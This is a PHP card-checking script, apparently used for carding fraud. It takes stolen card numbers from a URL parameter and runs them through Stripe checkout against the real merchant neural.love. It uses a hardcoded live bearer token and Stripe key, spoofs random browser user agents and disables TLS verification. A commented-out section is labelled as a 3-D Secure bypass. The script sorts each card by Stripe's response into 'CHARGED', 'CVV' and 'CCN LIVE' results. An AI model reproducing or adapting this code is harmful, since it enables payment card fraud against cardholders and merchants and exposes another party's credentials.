<?php

############Kingsahil##########
############[PHP SETUP]#############

          error_reporting(0);
          set_time_limit(0);
          error_reporting(0);
          date_default_timezone_set('America/Buenos_Aires');

          // https://www.gosh.org/_donate/?amount=1&frequency=single&campaign=1856

 

#########################[Functions + Lista]############################
         
          function multiexplode($delimiters, $string){
                  $one = str_replace($delimiters, $delimiters[0], $string);
                  $two = explode($delimiters[0], $one);
          return $two;}

                  $lista = $_GET['lista'];
                  $cc   = multiexplode(array(":", "|", " "), $lista)[0];
                  $mes  = multiexplode(array(":", "|", " "), $lista)[1];
                  $ano = multiexplode(array(":", "|", " "), $lista)[2];
                  $cvv  = multiexplode(array(":", "|", " "), $lista)[3];
                  
          function GetStr($string, $start, $end){
                  $str = explode($start, $string);
                  $str = explode($end, $str[1]);
          return $str[0];}

                  $amount = 'Charge : $'.rand(3,7).'.'.rand(01,99);
                  $amount2 = 'Not Charged';

          function value($str,$find_start,$find_end){
                  $start = @strpos($str,$find_start);
          if ($start === false){
          return "";}
                  $length = strlen($find_start);
                  $end    = strpos(substr($str,$start +$length),$find_end);
          return trim(substr($str,$start +$length,$end));}
          function mod($dividendo,$divisor){
          return round($dividendo - (floor($dividendo/$divisor)*$divisor));}

          function AllinOne($data = 42){
                return substr(strtolower(sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X%04X%04X', mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535))), 0, $data);};
           

#####################################

                  $guid = AllinOne();
                  $muid = AllinOne();
                  $sid = AllinOne();

#####################################
                  $time_on_page  = ucfirst(str_shuffle('67818'));
                  $z1  = substr($cc,0,3);
                  $z2  = substr($cc,3,6);

###################################[cs_live take]#####################
// Request URL
$url = 'https://saas.neural.love/api/billing/createPayment';

// Request headers
$headers = array(
  'accept: application/json, text/plain, */*',
  'accept-encoding: gzip, deflate, br',
  'accept-language: en-US,en;q=0.9',
  'authorization: Bearer eyJraWQiOiJMY0dieDk5enlvYTBld1RFZmJsZXlvXC9wa1REZmZzUjhyRUFtY21DdlwvV1U9IiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiIyMWJkODg4Ny1kNGZlLTRmMjktYjZmNS0xZjdhMGJlYTZkNTkiLCJhdWQiOiIzNXYzbTVvOGt1aDVtbTV2ajFwa2QwdmltOSIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJldmVudF9pZCI6ImMzNDNjZDNmLWQ5N2YtNDM5ZS1hMTBlLTc4YjI3YjUyN2E3ZiIsInRva2VuX3VzZSI6ImlkIiwiYXV0aF90aW1lIjoxNjc2OTU4MjM0LCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtd2VzdC0yLmFtYXpvbmF3cy5jb21cL3VzLXdlc3QtMl9nbVhwT0doRTgiLCJjb2duaXRvOnVzZXJuYW1lIjoiMjFiZDg4ODctZDRmZS00ZjI5LWI2ZjUtMWY3YTBiZWE2ZDU5IiwiZXhwIjoxNjc2OTYxODM0LCJpYXQiOjE2NzY5NTgyMzQsImVtYWlsIjoiampjeW12emVAa2FyZW5rZXkuY29tIn0.40Jbio5WjLRQnICaITLWi6D6QCLHfSTyQskNJx_vQ7R2RINeNHChO8xhaZhMUxzJFsiaxk2JTY3WIR0z05wLAcIAuq8_JYEI7t947cR72OxYxbgHRxxers2TBwqadJ4v9sEk-IY74IWWqvKZdQbEIlNR5wMvn-qfE_K28y2zzr-fwAaS__Toc5x79fF7dqCJJnLqWXcR23XItDYhBozsKBhQVdKMCN0ByLmuUkAKT6qh244LNPgEDMFw26Fc3Ad8Gp4E4RJNlopYz2pV42TjQQr6ekKganBzWeZJdaxfKtP0SgUtRKzi5-FVnIltxCiN3xY803fZABJqa5SSKo3G7g',
  'content-type: application/json; charset=UTF-8',
  'origin: https://neural.love',
  'referer: https://neural.love/',
  'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
  'sec-ch-ua-mobile: ?0',
  'sec-ch-ua-platform: "Windows"',
  'sec-fetch-dest: empty',
  'sec-fetch-mode: cors',
  'sec-fetch-site: same-site',
  'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
  'x-device-id: ebe6bb6b76697ee3b4c4853c56f787a4cac494fe43275413c21eaa1b264c514a',
  'x-referer: https://checkout.stripe.com/'
);

// Request content
$data = array(
  'creditsAmount' => 100,
  'priceId' => 'price_1KtFqXCN06sIGwWxEuNYUUHR'
);
$content = json_encode($data);

// Initialize cURL session
$ch = curl_init();

// Set cURL options
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $content);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Send the request and get the response
$response = curl_exec($ch);

// Close cURL session
curl_close($ch);

// Parse the sessionId from the response
preg_match('/{"sessionId":"(.+?)"/', $response, $matches);
$cslive = $matches[1];

// output sessionId
// echo $cslive;
// #########################[1 REQ]############################


        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: api.stripe.com',
               'method: POST',
               'path: /v1/payment_methods',
               'scheme: https',
               'accept: application/json',
               'accept-language: en-US,en;q=0.9',
               'content-type: application/x-www-form-urlencoded',
               'origin: https://checkout.stripe.com',
               'referer: https://checkout.stripe.com/',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'sec-gpc: 1',
               'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]=Mike+sith&billing_details[email]=jjcymvze%40karenkey.com&billing_details[address][country]=IN&guid=d0bf9c61-e089-4607-99cb-02a5524b9e26ead1b1&muid=3604eb15-4948-40ee-b85b-5c4ddb71dd31c7f834&sid=f13cd68a-fde1-44f2-b0c0-2b0aa892123f9be4a4&key=pk_live_51HpyyHCN06sIGwWxQvcXJ91D5fNxKvO8scpIruZXLgY7wmKxp0TmilQulQMMK6Mm99xnW1jUms9Kfwu0u5NpS6Kr00sEMvDmq6&payment_user_agent=stripe.js%2Ff06870666%3B+stripe-js-v3%2Ff06870666%3B+checkout');
        
        $r1 = curl_exec($ch);
        $id = Getstr($r1,'"id": "','"');

############################[2 Req]############################
 
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive.'/confirm');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: api.stripe.com',
               'method: POST',
               'path: /v1/payment_pages/'.$cslive.'/confirm',
               'scheme: https',
               'accept: application/json',
               'accept-language: en-US,en;q=0.9',
               'content-type: application/x-www-form-urlencoded',
               'origin: https://checkout.stripe.com',
               'referer: https://checkout.stripe.com/',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'sec-gpc: 1',
               'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&payment_method='.$id.'&expected_amount=1000&expected_payment_method_type=card&key=pk_live_51HpyyHCN06sIGwWxQvcXJ91D5fNxKvO8scpIruZXLgY7wmKxp0TmilQulQMMK6Mm99xnW1jUms9Kfwu0u5NpS6Kr00sEMvDmq6');
        
        $r2 = curl_exec($ch);
      
      //  $stripe_js = Getstr($r2,'"stripe_js": "','"');
      // $src = Getstr($r2,'"three_d_secure_2_source": "','"');
     
    //  $client_secret = Getstr($r2,'"client_secret": "','"');
    // $pi = Getstr($r2,'"client_secret": "','_secret');
    

#####################[3ds Bypass using url]#############
// if (strpos($r2, "https://hooks.stripe.com/redirect/authenticate/"))   
// {
//          $ch = curl_init();
//           $bin = substr($cc, 0,6);
//           curl_setopt($ch, CURLOPT_URL, ''.$stripe_js.'');
//           curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//                   $r4 = curl_exec($ch);
             
// }
// #####################[3ds Bypass using url]#############
// if (strpos($r2, "three_d_secure_2_source"))   
// {
//                 $ch = curl_init();
//         curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
//         curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//         curl_setopt($ch, CURLOPT_HEADER, 0);
//         curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//                'authority: api.stripe.com',
//                'method: POST',
//                'path: /v1/3ds2/authenticate',
//                'scheme: https',
//                'accept: application/json',
//                'accept-language: en-US,en;q=0.9',
//                'content-type: application/x-www-form-urlencoded',
//                'origin: https://js.stripe.com',
//                'referer: https://js.stripe.com/',
//                'sec-fetch-dest: empty',
//                'sec-fetch-mode: cors',
//                'sec-fetch-site: same-origin',
//                'sec-gpc: 1',
//                'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
//         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//         curl_setopt($ch, CURLOPT_POSTFIELDS, 'source='.$src.'&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22864%22%2C%22browserScreenWidth%22%3A%221536%22%2C%22browserTZ%22%3A%22-330%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F109.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_51HP2WxDtYuzMl8oxGIjU2GakXYVkZvUJMOVRokOJ97g7VNGLb5FVP5CIRQjU5JnOcqeqW4XEFOp2rTNa92oTfRZ100avSDHKRk');
        
//         $srcresult = curl_exec($ch);
      
//   }
// ########################[result url]#####################

//     $ch = curl_init();
//           curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'?key=pk_live_51HP2WxDtYuzMl8oxGIjU2GakXYVkZvUJMOVRokOJ97g7VNGLb5FVP5CIRQjU5JnOcqeqW4XEFOp2rTNa92oTfRZ100avSDHKRk&is_stripe_sdk=false&client_secret='.$client_secret.'');
//           curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//                   $result31 = curl_exec($ch);


########################[Responses]############################
if(strpos($r2,'"status": "succeeded')){
  $status = '#CHARGED';
  $cc_code = '『 CHARGE PASS✅= 』';
  $reqfind = '2 Req';
}

// elseif(strpos($result31,'Membership Confirmation')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31,'Thank you for your support')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31,'Thank you for your donation')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31,'/wishlist-member/?reg=')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, 'Thank You')) {
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, '\"success\":true')) {
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, 'pass')) {
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, 'wcf-key')) {
//  $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';

  
// }

elseif(strpos($r2, 'incorrect_zip')) {
  $status = '#CVV';
  $cc_code = '『 incorrect_zip ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, 'transaction_not_allowed')) {
  $status = '#CVV';
  $cc_code = '『 transaction_not_allowed ✅ 』';
  $reqfind = '2 Req';
}
elseif (strpos($r2,'Your card does not support this type of purchase.')) {
  $status = '#CVV';
  $cc_code = '『 Your card does not support this type of purchase ✅ 』';
  $reqfind = '2 Req';
}
elseif (strpos($r2,'card does not support this type of purchase.')) {
  $status = '#CVV';
  $cc_code = '『 Your card does not support this type of purchase ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, '\"cvc_check\": \"pass\"')) {
  $status = '#CVV';
  $cc_code = '『 CVC_CHECK: PASS ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, 'Your card has Insufficient Funds ✅.')) {
  $status = '#CVV';
  $cc_code = '『 Insufficient Funds ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, 'card has Insufficient Funds ✅.')) {
  $status = '#CVV';
  $cc_code = '『 Insufficient Funds ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, 'insufficient_funds')) {
  $status = '#CVV';
  $cc_code = '『 Insufficient Funds ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "security code is incorrect." )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "security code is invalid" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "Security code is incorrect" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "incorrect_cvc" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "card_decline_rate_limit_exceeded" )) {
  $status = 'Dead❌';
  $cc_code = '『 card_decline_rate_limit_exceeded 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "Your card is not supported" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card is not supported 』';
  $reqfind = '2 Req';
}
  elseif(strpos($r2, "card is not supported" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card is not supported 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "Your card was declined" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card was declined 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "fraudulent" )) {
  $status = 'Dead❌';
  $cc_code = '『 fraudulent 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "-----BEGIN CERTIFICATE-----" )) {
  $status = 'Dead❌';
  $cc_code = '『 3ds OTP 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "do_not_honor" )) {
  $status = 'Dead❌';
  $cc_code = '『 do_not_honor 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "generic_decline" )) {
  $status = 'Dead❌';
  $cc_code = '『 generic_decline 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "card was declined" )) {
  $status = 'Dead❌';
  $cc_code = '『 card was declined 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "Your card number is incorrect" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card number is incorrect 』';
  $reqfind = '2 Req';
}
  elseif(strpos($r2, "card number is incorrect" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card number is incorrect 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "pickup_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Pickup Card (Reported Stolen Or Lost 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "payment_intent_authentication_failure" )) {
  $status = 'Dead❌';
  $cc_code = '『 The provided PaymentMethod has failed authentication 』';
  $reqfind = '2 Req';
}
else{
  $status = 'Dead❌';
  $cc_code = '『 Problem Not Detected Form Ur cards 』';
  $reqfind = '2 Req';
}




//=======================[Responses-END]==============================//


    echo '</br>'.$MADEBY.' ['.$status.'] '.$lista.''.$cc_code.''.$bindata1.'</br>';

    echo "<b>Last result=</b>$r2<br><br>";
//sleep(2)
   
?> 